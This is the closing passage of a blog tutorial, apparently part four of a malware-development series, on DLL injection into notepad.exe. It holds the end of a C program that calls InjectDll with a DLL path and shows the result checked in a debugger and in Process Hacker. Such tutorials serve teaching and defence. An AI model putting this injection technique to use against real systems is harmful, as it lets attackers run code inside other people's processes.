    <span class="n">printf</span><span class="p">(</span><span class="s">"Notepad.exe is at %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">ProcID</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kt">wchar_t</span> <span class="n">myString</span><span class="p">[]</span> <span class="o">=</span> <span class="s">L"C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">XXX</span><span class="se">\\</span><span class="s">Source</span><span class="se">\\</span><span class="s">Repos</span><span class="se">\\</span><span class="s">EnumProcesses</span><span class="se">\\</span><span class="s">x64</span><span class="se">\\</span><span class="s">Debug</span><span class="se">\\</span><span class="s">Dll1.dll"</span><span class="p">;</span>

  <span class="n">LPWSTR</span> <span class="n">DllName</span> <span class="o">=</span> <span class="n">myString</span><span class="p">;</span>

  <span class="n">InjectDll</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">DllName</span><span class="p">);</span>

  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>Make sure to specify the full path of your DLL.</p>
</blockquote>

<h2 id="executing" class="active">Executing<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-04/#executing" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>Now let’s try to execute after compiling all of this together, put a breakpoint after the write operation and before the thread creation so we can validate the write.</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/4-1.png" alt="P2"></p>

<p>After triggering the breakpoint we can see that it found notepad.exe.</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/4-2.png" alt="P3">
<img src="https://ry0dan.github.io/assets/images/malware-development/4-3.png" alt="P4"></p>

<p>We can copy now the address of the allocated memory and check notepad’s memory using Process Hacker:</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/4-4.png" alt="P5"></p>

<p>And we can see that the path was indeed written there:
<img src="https://ry0dan.github.io/assets/images/malware-development/4-5.png" alt="P6"></p>

<blockquote>
  <p>Note: it’s a wide string that’s why every character is taking two bytes to be represented.</p>
</blockquote>

<p>Now continue the execution. And our DLL will be loaded successfully.</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/4-6.png" alt="P7"></p>

<p>Thanks for reading!.</p>

        
      </section>

      

      

      
  

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term...">
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    

    
  
  














  

</body></html>